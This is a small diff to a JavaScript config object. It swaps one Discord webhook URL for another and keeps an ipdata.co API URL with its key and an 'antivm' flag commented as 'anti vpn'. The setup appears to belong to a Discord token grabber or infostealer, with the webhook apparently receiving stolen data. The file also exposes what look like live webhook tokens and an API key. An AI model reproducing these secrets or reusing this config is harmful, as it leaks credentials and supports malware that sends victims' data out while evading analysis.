@@ -1,5 +1,5 @@
 const config = {
-    "webhook": 'https://discord.com/api/webhooks/1399884089443487754/qjDEYvu0Z8XAOEARVsRIsAxiOV5adxmGqxGUeIgdmcvAN07E7ocr7EclPIxUbRUer2U-',
+    "webhook": 'https://discord.com/api/webhooks/1403510305211944992/ZPeclrra6_42HgemjaDShrWXFcbYObW6rU3HlQJCHEDWDyyU49JfIIGNY2zcS46qoQ3E',
     "api": 'https://api.ipdata.co/?api-key=6818a70bf0dcdbf1dd6bf89e62299740a49725ac65ff8e4056e3b343',
     "antivm": true // anti vpn and shittt ig
 };
